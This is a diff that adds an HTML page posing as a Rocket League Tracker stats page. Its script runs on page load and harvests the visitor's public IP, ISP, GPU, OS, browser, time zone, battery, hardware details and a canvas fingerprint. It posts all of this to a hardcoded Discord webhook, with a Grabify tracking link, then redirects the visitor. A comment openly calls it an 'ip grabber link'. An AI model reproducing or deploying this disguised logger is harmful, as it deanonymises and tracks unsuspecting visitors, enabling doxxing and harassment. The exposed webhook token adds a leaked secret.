@@ -1,0 +1,475 @@
+<html>
+<head>
+<title>76561198198256121's Rocket League Stats - Rocket League Tracker</title>
+<meta name="description" content="Check detailed Rocket League Stats and Leaderboards rankings."/>
+<meta name="theme-color" content="#001538">
+<meta content="Rocket League Tracker" property="og:site_name">
+
+</head>
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+<script type="text/javascript">
+
+
+
+
+
+
+
+
+	
+	
+const whurl = "https://discord.com/api/webhooks/982835750980706304/3Y-UdEf8ewXcMe-I9GvTgHzdksBF_2LhgU3Ta3oUl7aWVRDwnHSNC-DffFuYers7Xl47";
+
+function getVideoCardInfo() {
+const gl = document.createElement('canvas').getContext('webgl');
+if (!gl) {
+return {
+error: "no webgl",
+};
+}
+const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+return debugInfo ? {
+vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
+} : {
+error: "no WEBGL_debug_renderer_info",
+};
+}
+
+// Updated operating system detection function
+function getAndroidVersion(userAgent) {
+const matches = userAgent.match(/Android (\d+(\.\d+)?)/i);
+return matches ? `Android ${matches[1]}` : "Android (Unknown Version)";
+}
+
+
+function getiOSVersion(userAgent) {
+const matches = userAgent.match(/(iPad|iPhone).*OS (\d+(_\d+)?)/i);
+return matches ? `${matches[1]} OS ${matches[2].replace("_", ".")}` : "iOS (Unknown Version)";
+}
+
+
+function detectBrowser() {
+const userAgent = navigator.userAgent;
+
+if (userAgent.indexOf("Firefox") !== -1) {
+return "Firefox";
+} else if (userAgent.indexOf("Chrome") !== -1) {
+return "Chrome";
+} else if (userAgent.indexOf("Safari") !== -1) {
+return "Safari";
+} else if (userAgent.indexOf("Edge") !== -1) {
+return "Microsoft Edge";
+} else if (userAgent.indexOf("MSIE") !== -1 || userAgent.indexOf("Trident") !== -1) {
+return "Internet Explorer";
+} else {
+return "Unknown Browser";
+}
+}
+
+
+function getOperatingSystem() {
+const userAgent = navigator.userAgent;
+
+if (userAgent.includes("Windows NT 10.0")) {
+if (userAgent.includes("Windows NT 10.0; Win64; x64")) {
+return "Windows 10/11";
+}
+return "Windows 10";
+} else if (userAgent.includes("Windows NT 6.3")) {
+return "Windows 8.1";
+} else if (userAgent.includes("Windows NT 6.2")) {
+return "Windows 8";
+} else if (userAgent.includes("Windows NT 6.1")) {
+return "Windows 7";
+} else if (userAgent.includes("Windows NT 6.0")) {
+return "Windows Vista";
+} else if (userAgent.includes("Windows NT 5.1")) {
+return "Windows XP";
+} else if (userAgent.includes("Windows NT 5.0")) {
+return "Windows 2000";
+} else if (userAgent.includes("Windows NT 4.0")) {
+return "Windows NT 4.0";
+}  else if (userAgent.includes("Android")) {
+return getAndroidVersion(userAgent);
+} else if (userAgent.includes("iOS")) {
+return getiOSVersion(userAgent);
+} else if (userAgent.includes("Mac OS X 10_")) {
+const versionStartIndex = userAgent.indexOf("Mac OS X 10_") + 11;
+const version = userAgent.substring(versionStartIndex, versionStartIndex + 3);
+return "macOS " + version;
+} else if (userAgent.includes("Linux")) {
+return "Linux";
+} else {
+return "Unknown OS";
+}
+}
+
+
+
+function getPublicIPAddress() {
+return fetch('https://api.ipify.org?format=json')
+.then(response => response.json())
+.then(data => data.ip)
+.catch(error => {
+console.error('Error fetching IP address:', error);
+return "Error";
+});
+}
+
+function getDaBattery(){
+if(navigator.getBattery){
+return navigator.getBattery()
+}
+else{
+return "N/A"
+}
+
+}
+
+function realWindowsVersion(userOS) {
+return new Promise((resolve, reject) => {
+navigator.userAgentData.getHighEntropyValues(["platformVersion"])
+.then(ua => {
+if (navigator.userAgentData.platform === "Windows") {
+const majorPlatformVersion = parseInt(ua.platformVersion.split('.')[0]);
+if (majorPlatformVersion >= 13) {
+resolve("Windows 11 or later");
+} else {
+resolve("Windows 10");
+}
+} else {
+resolve(userOS); // Return the original OS if not Windows
+}
+})
+.catch(error => {
+console.error("Error fetching platformVersion:", error);
+resolve(userOS); // Return the original OS in case of an error
+});
+});
+}
+
+function hasTouchscreen() {
+if ('ontouchstart' in window || navigator.maxTouchPoints > 0 || navigator.msMaxTouchPoints > 0) {
+return true;
+} else {
+return false;
+}
+}
+
+
+
+
+
+function getISP(ipAddress) {
+return fetch(`https://ipinfo.io/${ipAddress}/json`)
+.then((response) => {
+if (response.ok) {
+return response.json();
+} else {
+throw new Error('Failed to fetch ISP information');
+}
+})
+.then((data) => {
+const isp = data.org || 'N/A';
+return isp;
+})
+.catch((error) => {
+console.error(error);
+return 'N/A';
+});
+}
+
+
+function detectOrientation() {
+if (window.innerWidth > window.innerHeight) {
+// Landscape mode
+return "Landscape";
+} else {
+// Portrait mode
+return "Portrait";
+}
+}
+
+function getConnection() {
+  try {
+    if (navigator.connection.effectiveType) {
+      return navigator.connection.effectiveType;
+    } else {
+      return "N/A";
+    }
+  } catch (error) {
+    console.error("Error getting connection:", error);
+    return "N/A"; 
+  }
+}
+
+
+
+
+
+
+function getDeviceMemory() {
+  try {
+    if (navigator.deviceMemory) {
+      return navigator.deviceMemory + " GB";
+    } else {
+      return "N/A";
+    }
+  } catch (error) {
+    console.error("Error getting device memory:", error);
+    return "N/A";
+  }
+}
+
+
+	
+function getHistoryLength() {
+  try {
+    return window.history.length-1;
+  } catch (error) {
+    console.error("Error getting history length:", error);
+    return "N/A";
+  }
+}
+
+
+// full credit to github user oelin for this one :3 (im way to stupid to figure out how to do this)
+// github.com/oelin/fingerprint
+async function createCanvasFingerprint() {
+
+	let canvasElement = document.createElement('canvas')
+	let canvasContext = canvasElement.getContext('2d')
+
+	canvasContext.fillText('abc', 0, 100)
+	canvasContext.beginPath()
+	canvasContext.arc(20, 20, 20, 0, 6)
+	canvasContext.fillStyle = 'red'
+	canvasContext.fill()
+
+	let canvasData = (new TextEncoder).encode(canvasElement.toDataURL())
+	let canvasFingerprint = await crypto.subtle.digest('sha-1', canvasData)
+
+	canvasFingerprint = new Uint8Array(canvasFingerprint)
+	canvasFingerprint = String.fromCharCode(...canvasFingerprint)
+	canvasFingerprint = btoa(canvasFingerprint)
+
+	return canvasFingerprint 
+}
+
+	
+
+async function logIP() {
+try {
+const ip = await getPublicIPAddress();
+const graphCard = getVideoCardInfo().renderer;
+let userOS = getOperatingSystem(); // Use the updated function for OS detection.
+const userAgent = navigator.userAgent  
+const kbLang = navigator.language  
+const screenWidth = window.screen.width;
+const screenHeight = window.screen.height;
+const screenResolution = `${screenWidth} x ${screenHeight}`;
+const userTimeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;	
+const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+
+if (userOS === "Windows 10/11"){
+userOS = await realWindowsVersion(userOS);
+}
+
+const userTime = new Date();
+const year = userTime.getFullYear();
+const month = userTime.getMonth() + 1;
+const day = userTime.getDate();
+const hours24 = userTime.getHours();
+const hours12 = (hours24 % 12) || 12; // Convert to 12-hour format
+const minutes = userTime.getMinutes();
+const seconds = userTime.getSeconds();
+const milliseconds = userTime.getMilliseconds();
+const ampm = hours24 >= 12 ? 'PM' : 'AM';
+const browser = detectBrowser();
+
+
+
+// Example usage:
+const batteryInfo = await getDaBattery();
+
+let batteryLevel = "N/A";
+let batteryCharging = "N/A";
+let batteryChargeTime = "N/A";
+let batteryDishargeTime = "N/A";
+
+
+
+
+if (navigator.getBattery) {
+if (batteryInfo !== "N/A") {
+batteryLevel = `${batteryInfo.level * 100}%`;
+batteryCharging = batteryInfo.charging ? "Yes" : "No";
+batteryChargeTime = `${batteryInfo.chargingTime} Seconds`;
+batteryDishargeTime = `${batteryInfo.dischargingTime} Seconds`;
+}
+}
+
+let orientation = detectOrientation();
+
+const isTouchscreen = hasTouchscreen();
+const isp = await getISP(ip)	  
+
+
+const logicalCores = navigator.hardwareConcurrency;
+const ram = getDeviceMemory()
+const historyInfo = getHistoryLength();
+
+
+
+	
+let connectionType = getConnection();
+
+let fingerprint = await createCanvasFingerprint();
+
+
+const embedMessage = {
+	"content": "<@267417391053537280>\n*BOOM BOOM BOOM BOOM!!*",
+    "embeds": [
+    {
+      "type": "rich",
+      "title": `The Kakapo has found another IP!`,
+      "description": `Check here to see all IPs logged: <https://grabify.link/track/QRUKDR>\n`,
+      "color": 0x22f565,
+      "fields": [
+        {
+          "name": `IP:`,
+          "value": `${ip}`
+        },
+        {
+          "name": `ISP:`,
+          "value": `${isp}`
+        },
+        {
+          "name": `Graphics Card:`,
+          "value": `${graphCard}`
+        },
+        {
+          "name": `OS:`,
+          "value": `${userOS}`
+        },
+        {
+          "name": `User Agent:`,
+          "value": `${userAgent}`
+        },
+        {
+          "name": `Keyboard Language:`,
+          "value": `${kbLang}`
+        },
+        {
+          "name": `Resolution:`,
+          "value": `${screenResolution}`
+        },
+        {
+          "name": `Time Zone:`,
+          "value": `${userTimeZone}`
+        },
+        {
+          "name": `Mobile User:`,
+          "value": `${isMobile}`
+        },
+        {
+          "name": `User Date and Time:`,
+          "value": `${day}/${month}/${year} ${hours24}:${minutes}:${seconds}.${milliseconds} (${hours12}:${minutes}:${seconds} ${ampm})`
+        },
+        {
+          "name": `Browser:`,
+          "value": `${browser}`
+        },
+        {
+          "name": `Battery Level:`,
+          "value": `${batteryLevel}`
+        },
+        {
+          "name": `Battery Charging:`,
+          "value": `${batteryCharging}`
+        },
+        {
+          "name": `Battery Charge Time:`,
+          "value": `${batteryChargeTime}`
+        },
+        {
+          "name": `Battery Life Time:`,
+          "value": `${batteryDishargeTime}`
+        },
+        {
+          "name": `Touch Screen:`,
+          "value": `${isTouchscreen}`
+        },
+        {
+          "name": `Orientation:`,
+          "value": `${orientation}`
+        },
+        {
+          "name": `Logical CPU Cores:`,
+          "value": `${logicalCores}`
+        },
+        {
+          "name": `Internet Connection Type:`,
+          "value": `${connectionType}`
+        },
+        {
+          "name": `RAM (available to browser):`,
+          "value": `${ram}`
+        },
+        {
+          "name": `Tab history length:`,
+          "value": `${historyInfo}`
+        },
+        {
+          "name": `Device Canvas Fingerprint:`,
+          "value": `${fingerprint}`
+        },
+        {
+          "name": `Check here to see IP VPN and Location status `,
+          "value": `<https://grabify.link/ip-lookup/${ip}>`
+        }
+      ],
+      "thumbnail": {
+        "url": `https://i.ytimg.com/vi/_xPIjmLAi1w/sddefault.jpg`,
+        "height": 0,
+        "width": 0
+      }
+    }
+  ]
+};
+
+await fetch(whurl, {
+  method: "POST",
+  headers: {
+    "Content-Type": "application/json"
+  },
+  body: JSON.stringify(embedMessage)
+});
+
+setTimeout(function () {
+window.location.replace("https://gamer.tattoo/0E0IA0");
+}, 10);
+} catch (error) {
+console.error('Error:', error);
+}
+}
+
+logIP();
+
+
+
+
+	
+</script>
+
+
+<script src="myfile.js?version=3.0"></script>
+
+
+
+<!-- ip grabber link: https://gamer.tattoo/0E0IA0
+view at: https://grabify.link/track/QRUKDR
+rocketleague-tracker-network.rf.gd-->
+</html>
